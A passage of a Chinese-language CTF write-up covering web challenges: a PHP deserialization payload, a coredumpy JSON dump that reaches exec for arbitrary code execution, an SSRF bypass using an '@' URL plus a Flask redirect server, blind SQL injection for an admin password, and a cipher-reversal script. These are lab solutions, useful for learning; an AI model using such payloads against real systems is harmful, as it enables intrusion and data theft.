class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure></div>

<p>最后输出了flag：<br><code>Recovered flag: W4terCTF&#123;WhEn_y0Ur_Dr34mS_cOME_ALiVe_YOU&#39;r3_uNs7oPPaBle&#125;</code></p>
<p><em>When your Dreams come alive you’re unstoppable~~</em></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="HappyPHP"><a href="#HappyPHP" class="headerlink" title="HappyPHP"></a>HappyPHP</h3><p>用一种非常谐的方式非预期了。</p>
<p>我们还在琢磨怎么用 PHP 魔法让 <code>intval(xxx) == &quot;Yelia&quot;</code>以及 SHA1 + MD5 同时碰撞（这个倒是弄出来了， NAN 即可），然后我冒出了个鬼点子🤓👆</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(phpinfo())</span><br></pre></td></tr></table></figure></div>

<p>直接把容器的底裤都扒出来了，笑死我了：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/3ykTcI58pSB6xZd.png"
                      alt="image-20250505000135351"
                ></p>
<p>下面是 payload 构造脚本：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpis</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$what</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">thebest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gogogo</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">language</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$piece1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">right</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sy</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$right_inst</span>=<span class="keyword">new</span> <span class="title function_ invoke__">right</span>();</span><br><span class="line"><span class="variable">$right_inst</span>-&gt;sy=NAN;</span><br><span class="line"><span class="variable">$right_inst</span>-&gt;su=NAN;</span><br><span class="line"></span><br><span class="line"><span class="variable">$lang_inst</span>=<span class="keyword">new</span> <span class="title function_ invoke__">language</span>();</span><br><span class="line"><span class="variable">$lang_inst</span>-&gt;v1=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$lang_inst</span>-&gt;piece1=<span class="variable">$right_inst</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 前面的都没用</span></span><br><span class="line"><span class="variable">$phpis_inst</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phpis</span>();</span><br><span class="line"><span class="variable">$phpis_inst</span>-&gt;fun1=<span class="string">&quot;print&quot;</span>;</span><br><span class="line"><span class="variable">$phpis_inst</span>-&gt;fun2=<span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$thebest_inst</span> = <span class="keyword">new</span> <span class="title function_ invoke__">thebest</span>();</span><br><span class="line"><span class="variable">$thebest_inst</span>-&gt;gogogo=<span class="variable">$phpis_inst</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$thebest_inst</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="Core-Dump-Error"><a href="#Core-Dump-Error" class="headerlink" title="Core Dump Error"></a>Core Dump Error</h3><ul>
<li>Author: tel</li>
<li>Difficulty: Easy</li>
<li>Category: Web</li>
</ul>
<p>比较简单的签到题目，打开视频发现居然是高天四月初发布的一个视频<del>当时刷到过但是看了个开头就没了</del>，简单看了看视频，大致原理应该是利用了coredumpy关于cpython和pdb的类加载机制，由于在coredumpy里面是需要载入dump文件的，然后frame中全局变量和局部变量会被dump重构，一旦构造传入一个exec的builtin function之后就可以达到执行任意指令的目的了。</p>
<p>没看懂？没关系，我们直奔GitHub仓库的issue，在视频中提到的issue下面找到这个json：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;objects&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;1&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;frame&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;attrs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;f_lineno&quot;</span><span class="punctuation">:</span> <span class="string">&quot;11&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;f_locals&quot;</span><span class="punctuation">:</span> <span class="string">&quot;12&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;f_code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;13&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;f_globals&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;f_back&quot;</span><span class="punctuation">:</span> <span class="string">&quot;15&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;11&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;int&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;12&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dict&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;13&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;code&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;attrs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;co_filename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;131&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;co_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;132&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;14&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dict&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;141&quot;</span><span class="punctuation">:</span> <span class="string">&quot;143&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;142&quot;</span><span class="punctuation">:</span> <span class="string">&quot;144&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;15&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NoneType&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;131&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;str&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;filename&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;132&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;str&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;141&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;str&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__name__&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;142&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;str&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;__loader__&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;143&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;str&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;print(&#x27;ARBITRARY CODE EXECUTION&#x27;)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;144&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EvilLoader&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;attrs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;get_source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1441&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;1441&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;builtin_function&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exec&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;threads&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;0&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;frame&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;current_thread&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.4.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>直接把143的print改成以下代码：<code>with open(&#39;/tmp/flag&#39;, &#39;r&#39;) as f:\n    print(f.read())\n</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/PJhi4gaFk1XGyYf.png"
                      alt="image-20250505203230309"
                ></p>
<p>轻松秒杀！</p>
<h3 id="CloseAI"><a href="#CloseAI" class="headerlink" title="CloseAI"></a>CloseAI</h3><p>题目意图还是很好懂的：用 admin 登陆，登陆后可以调用那个改写 API_URL 的接口；聊天的回复内容是服务器 POST API_URL 然后取响应体，这就有了往任意 URL 发 POST 并回显 的能力。fl4g 在 internal 模块里，可能用 post 读文件，也可能要扫 internal server 的接口。</p>
<p>给 hint 之前我们在琢磨怎么把 <code>ai_server.py</code>读出来，毕竟有<code>from ..ai_server import fl4g</code>。如果不是 hint 说 flag 在 <code>GET http://127.0.0.1:233/fl4g</code>，确实不知道怎么找这个接口。</p>
<h4 id="反弹POST"><a href="#反弹POST" class="headerlink" title="反弹POST"></a>反弹POST</h4><p><code>GET http://127.0.0.1:233/fl4g</code>只能在容器内网访问，那么唯一的入手点就是这个发往内网、URL 可以随便写的 POST 请求了，但是怎么把它变成 GET 呢？</p>
<p>经过一些折腾，想到可以自己开个 HTTP 服务器接受内部发出来的 POST 请求，返回一个 redirect ，redirect 回去肯定是 GET，搞定。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reflect</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;http://www.closeai.com@127.0.0.1:233/fl4g&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5995</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="过URL限制"><a href="#过URL限制" class="headerlink" title="过URL限制"></a>过URL限制</h4><p>用<code>/change_api</code>写 API_URL 会遇到两个限制，一是会校验 URL 里带不带 closeai 那个域名：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/o2ExChwMH6inkv5.png"
                      alt="image-20250504230700440"
                ></p>
<p>二是用 API_URL 发请求的时候会拼个<code>/api/chat</code>后缀：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/rjOnCVSc59NZ67K.png"
                      alt="image-20250504230736150"
                ></p>
<p>用了下面这个 URL 同时解决了这两个问题，后来才知道这玩意叫 SSRF。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.closeai.com@172.18.198.218:5995/reflect?a=</span><br></pre></td></tr></table></figure></div>

<p>第一个限制用 @ 绕过，第二个限制我放了个<code>?a=</code>在末尾，这样<code>/api/chat</code>就变成 URL 参数了，不影响路由。</p>
<h4 id="盲注admin密码"><a href="#盲注admin密码" class="headerlink" title="盲注admin密码"></a>盲注admin密码</h4><p>到这里唯一的问题是怎么以 admin 身份登陆。观察到唯一能 SQL 注入的点是这个地方，其它地方都是参数化的：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/EUIWMcRdzxZLT9y.png"
                      alt="image-20250505142611838"
                ></p>
<p>这里首先有个有意思的点，就是格式化的<code>!r</code>选项，它会给格式化后的子串套引号，那套的是单引号还是双引号呢？有意思的是，这个引号的选择会自适应子串内容，保证子串表示为一个合法的 python 字符串：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;\&#x27;&#x27;</span>!r&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># &quot;&#x27;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;\&quot;&#x27;</span>!r&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># &#x27;&quot;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;&quot;\&#x27;&#x27;</span>!r&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># &#x27;&quot;\&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>所以必须用第三种方法来闭合这个引号。</p>
<p>然后我们发现这个注入点操作空间很小：结果不回显，只能读不能写，唯一能知道的就是结果是不是为空，如果为空则会返回“不是你的对话”，这就可以布尔盲注了，密码为 32 位 hex。</p>
<h4 id="拿flag"><a href="#拿flag" class="headerlink" title="拿flag"></a>拿flag</h4><p>有密码后登陆 admin，开个反弹服务器，把 URL 写成反弹服务器，这样题目访问 URL 返回的东西就是 flag 了，开个聊天就可以在聊天的回复里看到回显：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/05/kg8dHEfoCOjru7Q.png"
                      alt="image-20250505160407056"
                ></p>
<h3 id="Front-End"><a href="#Front-End" class="headerlink" title="Front End"></a>Front End</h3><p>进来之后给了个 base64</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/Gte3BRfK6CVxJdS.png"
                      alt="image-20250504231220804"
                ></p>
<p>解出来我记得是 robots.txt，那就去看看：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/zy4JgqhiTIbRfSC.png"
                      alt="image-20250504231252856"
                ></p>
<p>然后去 hint.html：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/KYX6JVGZmW4t1wr.png"
                      alt="image-20250504231334848"
                ></p>
<p>源码里有一坨 jsfuck，解出 encode.php，这就是这题的主体了：</p>
 <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;./flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line"><span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)- <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="variable">$seed</span> = ( <span class="title function_ invoke__">mt_rand</span>() + <span class="number">1000000000</span> * <span class="title function_ invoke__">mt_rand</span>());<span class="comment">//你真的想爆破吗 QwQ</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$seed</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@!&quot;</span>;</span><br><span class="line">    <span class="variable">$nh</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">64</span>);</span><br><span class="line">    <span class="variable">$ch</span> = <span class="variable">$chars</span>[<span class="variable">$nh</span>];</span><br><span class="line">    <span class="variable">$mdKey</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$seed</span>.<span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$mdKey</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$mdKey</span>,<span class="variable">$nh</span>%<span class="number">8</span>, <span class="variable">$nh</span>%<span class="number">8</span>+<span class="number">7</span>);</span><br><span class="line">    <span class="variable">$data</span>= <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$k</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="variable">$k</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$mdKey</span>) ? <span class="number">0</span> : <span class="variable">$k</span>;</span><br><span class="line">        <span class="variable">$j</span> = (<span class="variable">$nh</span>+<span class="title function_ invoke__">strpos</span>(<span class="variable">$chars</span>,<span class="variable">$data</span>[<span class="variable">$i</span>])+<span class="title function_ invoke__">ord</span>(<span class="variable">$mdKey</span>[<span class="variable">$k</span>++]))%<span class="number">64</span>;</span><br><span class="line">        <span class="variable">$tmp</span> .= <span class="variable">$chars</span>[<span class="variable">$j</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$ch</span>.<span class="variable">$tmp</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$encrypted</span> = <span class="title function_ invoke__">encrypt</span>(<span class="variable">$flag</span>, <span class="variable">$seed</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Encrypted: &quot;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$encrypted</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>加密后的一坨东西会输出出来，我们得到的的输出是：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">7872566f49253430717272726d7750795847677459776d4148626369595134384850746958596e384a7261763530413432486c59435855</span><br></pre></td></tr></table></figure></div>

<p>这坨东西先后过了 urlencode 和 hex，还原后：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ch = &#x27;x&#x27;</span><br><span class="line">tmp = &#x27;rVoI@qrrrmwPyXGgtYwmAHbciYQ48HPtiXYn8Jrav50A42HlYCXU&#x27;</span><br></pre></td></tr></table></figure></div>

<p>然后根据 <code>ch = chars[nh]</code> 推得 <code>nh = 49</code></p>
<p>主要看这个 <code>tmp</code>，它每一位都是 <code>chars[j]</code> ，那就看<code>j</code></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$j = ($nh+strpos($chars,$data[$i])+ord($mdKey[$k++]))%64;</span><br><span class="line"></span><br><span class="line"># 整理后：</span><br><span class="line">j = nh + chars.index(data[i]) + ord(mdKey[i % len(mdKey)])</span><br><span class="line">	% 64</span><br></pre></td></tr></table></figure></div>

<p>其中<code>mdKey</code>是一坨随机产物的 md5 取了 8 位的子串，基本可以当成 8 位随机序列，没信息量；</p>
<p><code>data</code> 是 flag 取 base64，这玩意和<code>tmp</code>是等长的，所以根据它的长度可以试出 flag 的长度：</p>
<p><code>flag = &quot;W4terCTF&#123;&quot; + &quot;?&quot; * 29 + &quot;&#125;&quot;</code></p>
<p>可以看到难点在于<code>j</code>同时与<code>mdkey</code>和<code>base64(flag)</code>有关，<code>mdkey</code>又是随机的，看起来没法从<code>j</code>推得<code>flag</code>。</p>
<p>突破口也很简单：<code>mdkey</code>这 8 位在<code>data</code>上是循环用的，而<code>flag</code>的前 9 位已知，对应 base64 的前 8 位肯定已知，这样 8 位 mdkey 就推出来了，后面 flag 未知部分用 <code>j</code>和循环<code>mdkey</code>就能求。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://s2.loli.net/2025/05/04/JafFy1AheSgjGHk.png"
                      alt="image-20250504234922655"
                ></p>
<p>脚本：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">encrypted_hex = <span class="string">&quot;7872566f49253430717272726d7750795847677459776d4148626369595134384850746958596e384a7261763530413432486c59435855&quot;</span></span><br><span class="line">chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@!&quot;</span></span><br><span class="line"></span><br><span class="line">encrypted_url = <span class="built_in">bytes</span>.fromhex(encrypted_hex)</span><br><span class="line">encrypted = unquote(encrypted_url)</span><br><span class="line"></span><br><span class="line">ch, tmp = encrypted[:<span class="number">1</span>], encrypted[<span class="number">1</span>:]</span><br><span class="line">nh = chars.index(ch)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;W4terCTF&#123;&quot;</span> + <span class="string">&quot;Z&quot;</span> * <span class="number">29</span> + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">flag_b64 = b64encode(flag.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag_b64) == <span class="number">52</span></span><br><span class="line"><span class="keyword">assert</span> <span class="string">b&quot;=&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flag_b64</span><br><span class="line"></span><br><span class="line"><span class="comment"># j</span></span><br><span class="line"></span><br><span class="line">j_seq = [</span><br><span class="line">    chars.index(c) <span class="keyword">for</span> c <span class="keyword">in</span> tmp</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">j_minus_nh_minus_flagb64 = [</span><br><span class="line">    (j - nh - chars.index(<span class="built_in">chr</span>(flag_b64[i]))) % <span class="number">64</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(j_seq)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># mdkey</span></span><br><span class="line"></span><br><span class="line">j_minus_nh_minus_flagb64 = j_minus_nh_minus_flagb64[:<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">mdkey_ord = j_minus_nh_minus_flagb64</span><br><span class="line">mdkey = <span class="string">&quot;&quot;</span>.join(</span><br><span class="line">    [<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> j_minus_nh_minus_flagb64]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">mdkey_ext = (mdkey * <span class="number">10</span>)[:<span class="number">52</span>]</span><br><span class="line"></span><br><span class="line">flag_b64_idx = [</span><br><span class="line">    (j - nh - <span class="built_in">ord</span>(mdkey_ext[i])) % <span class="number">64</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(j_seq)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag_b64 = <span class="string">&quot;&quot;</span>.join([</span><br><span class="line">    chars[idx]</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> flag_b64_idx</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">flag = b64decode(flag_b64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------</span></span><br><span class="line"></span><br><span class="line">pipeline = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ch = <span class="subst">&#123;ch&#125;</span></span></span><br><span class="line"><span class="string">tmp = <span class="subst">&#123;tmp&#125;</span></span></span><br><span class="line"><span class="string">nh = <span class="subst">&#123;nh&#125;</span></span></span><br><span class="line"><span class="string">j_minus_shit: <span class="subst">&#123;j_minus_nh_minus_flagb64&#125;</span></span></span><br><span class="line"><span class="string">mdkey: <span class="subst">&#123;mdkey&#125;</span></span></span><br><span class="line"><span class="string">mdkey_ext: <span class="subst">&#123;mdkey_ext&#125;</span></span></span><br><span class="line"><span class="string">flag_b64_idx: <span class="subst">&#123;flag_b64_idx&#125;</span></span></span><br><span class="line"><span class="string">flag: <span 